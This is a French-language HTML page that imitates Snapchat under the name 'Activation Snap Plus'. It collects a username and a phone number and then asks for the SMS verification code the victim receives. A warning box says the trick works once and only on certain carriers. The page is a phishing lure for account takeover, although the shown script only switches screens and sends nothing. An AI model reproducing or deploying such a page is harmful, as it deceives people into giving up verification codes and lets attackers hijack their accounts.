<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    
    <meta name="theme-color" content="#1e053d">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
    <title>Activation Snap Plus</title>
    <style>
        /* --- FOND ET SCROLL --- */
        html {
            background-color: #1e053d; 
            margin: 0;
            padding: 0;
            height: 100%;
            overscroll-behavior-y: none; 
        }

        body {
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at top, #1e053d 0%, #0d011a 80%) no-repeat fixed;
            background-color: #0d011a; 
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            overflow-y: auto;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
        }

        .container {
            width: 100%;
            max-width: 380px;
            padding: 40px 20px;
            text-align: center;
            box-sizing: border-box;
        }

        /* --- LOGO --- */
        .logo-wrapper {
            position: relative;
            width: 160px;
            height: 160px;
            margin: 0 auto 35px;
        }

        .border-gradient {
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #cc33ff, #ff0080);
            border-radius: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
        }

        .snap-bg {
            width: 88%;
            height: 88%;
            background-color: #fffc00;
            border-radius: 32px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-img { width: 75%; height: auto; }

        .plus-badge {
            position: absolute;
            top: -4px;
            right: -4px;
            background-color: #ffb400;
            color: #1a0133;
            width: 42px;
            height: 42px;
            border-radius: 50%;
            font-size: 26px;
            font-weight: bold;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 4px solid #1e053d;
        }

        .title {
            color: #df80ff;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 35px;
            text-shadow: 0 0 10px rgba(223, 128, 255, 0.3);
            text-transform: uppercase;
        }

        /* --- CHAMPS DE SAISIE --- */
        .input-group {
            display: flex;
            border: 2px solid rgba(255, 0, 255, 0.5);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
            background-color: #0d011a;
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.1);
            align-items: center;
        }

        .prefix-phone {
            background-color: #1a0533;
            padding: 15px;
            font-weight: bold;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-right: 1px solid rgba(255, 0, 255, 0.2);
        }

        input {
            flex: 1;
            border: none;
            background: transparent;
            padding: 18px;
            color: #ffffff;
            font-size: 17px;
            outline: none;
            width: 100%;
        }

        input::placeholder { color: #4b4b4b; }

        /* --- TEXTES SMS (image_10.png) --- */
        .sms-instruction {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 8px;
            line-height: 1.3;
        }

        .sms-subtext {
            color: #7a7a7a;
            font-size: 14px;
            margin-bottom: 25px;
        }

        /* --- BOUTONS --- */
        .btn-glow {
            width: 100%;
            background: linear-gradient(135deg, #cc33ff, #ff0080);
            border: none;
            border-radius: 12px;
            padding: 18px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            margin: 10px 0 40px;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
            transition: 0.3s;
        }

        .btn-glow:active { transform: scale(0.98); }
        .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }

        /* --- INFO BOX --- */
        .info-box {
            background-color: rgba(25, 10, 45, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 20px;
        }

        .info-header { color: #ffcc00; font-weight: bold; margin-bottom: 10px; }
        .info-text { color: #a0a0a0; font-size: 14px; margin: 0; }
    </style>
</head>
<body>

    <div class="container">
        
        <div class="logo-wrapper">
            <div class="border-gradient">
                <div class="snap-bg"><img src="logo-snapchat.png" alt="" class="logo-img"></div>
            </div>
            <div class="plus-badge">+</div>
        </div>

        <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>

        <!-- ÉTAPE 1 : NOM ET NUMÉRO -->
        <div id="step-1">
            <div class="input-group">
                <input type="text" placeholder="Nom d'utilisateur Snapchat" style="padding-left: 20px;">
            </div>
            <div class="input-group">
                <div class="prefix-phone">🇫🇷 +33</div>
                <input type="tel" placeholder="123456789" maxlength="10">
            </div>
            <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
        </div>

        <!-- ÉTAPE 2 : CODE SMS (Masqué au départ) -->
        <div id="step-2" style="display: none;">
            <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
            <div class="sms-subtext">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
            
            <div class="input-group">
                <input type="tel" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
            </div>
            <button class="btn-glow">Vérifier</button>
        </div>

        <div class="info-box">
            <div class="info-header">ATTENTION ⚠️</div>
            <p class="info-text">
                La tech marche qu'une seule fois en raison d'abus. Malheureusement la tech fonctionne seulement avec les opérateurs 
                <strong>SFR, BOUYGUES, ORANGE</strong>
            </p>
        </div>

    </div>

    <script>
        function processValidation() {
            const btn = document.getElementById('submitBtn');
            const step1 = document.getElementById('step-1');
            const step2 = document.getElementById('step-2');

            // 1. Changement du texte du bouton
            btn.innerHTML = "Envoi en cours";
            btn.disabled = true;

            // 2. Attente de 2 secondes avant le changement d'interface
            setTimeout(() => {
                step1.style.display = 'none';
                step2.style.display = 'block';
            }, 2000);
        }
    </script>

</body>
</html>
